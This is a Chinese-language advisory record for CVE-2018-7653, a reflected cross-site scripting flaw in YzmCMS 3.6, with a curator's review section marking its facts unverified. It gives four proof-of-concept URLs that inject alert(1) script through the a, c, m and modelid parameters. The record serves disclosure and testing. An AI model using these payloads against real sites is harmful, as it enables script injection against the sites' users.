---
cve: "CVE-2018-7653"
source: "Mr-xn/Penetration_Testing_POC"
product: "YzmCMS3.6"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-7653"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "YzmCMS 3.6存在XSS漏洞2"
prerequisites: "来源所述条件，未列明部分仍待核：publicsearchrouting/error rendering;version3.6claimed"
side_effects: "未执行；本文需注意的操作影响：概述只a/c/m，PoC还modelid，应核CVE覆盖的第四参数"
source_status: "unknown"
id: "vw-241688832cdf1f8fe73a3320"
entity_id: "ve-241688832cdf1f8fe73a3320"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：publicsearchrouting/error rendering;version3.6claimed

- **操作与副作用边界（1）**：概述只a/c/m，PoC还modelid，应核CVE覆盖的第四参数。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（2）**：仅URL没有源码/反射响应/修复，元数据表有MITRE原标识可核。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（3）**：与652四条同payload（只域名不同）同漏洞简稿，合并发现者/上报元数据与652来源。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（4）**：代码块标HTML但内容URL，轻微格式规范。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YzmCMS 3.6存在XSS漏洞2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|YzmCMS 3.6存在XSS漏洞|2018-04-05|zzw (zzw@5ecurity.cn)|[http://www.yzmcms.com/](http://www.yzmcms.com/) | [http://www.yzmcms.com/](http://www.yzmcms.com/) |3.6| [CVE-2018-7653](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7653)|  

#### 漏洞概述  

> YzmCMS 3.6版本的 index.php页面a、c、m参数过滤不严格可导致跨站脚本漏洞。  

### POC实现代码如下：  

> poc代码:

``` html
http://localhost/YzmCMS/index.php?m=search&c=index&a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&modelid=1&q=tes 
 
http://localhost/YzmCMS/index.php?m=search&c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&a=init&modelid=1&q=tes 
 
http://localhost/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&c=index&a=init&modelid=1&q=tes 
 
http://localhost/YzmCMS/index.php?m=search&c=index&a=init&modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&q=tes
```


---

> 来源：Mr-xn/Penetration_Testing_POC
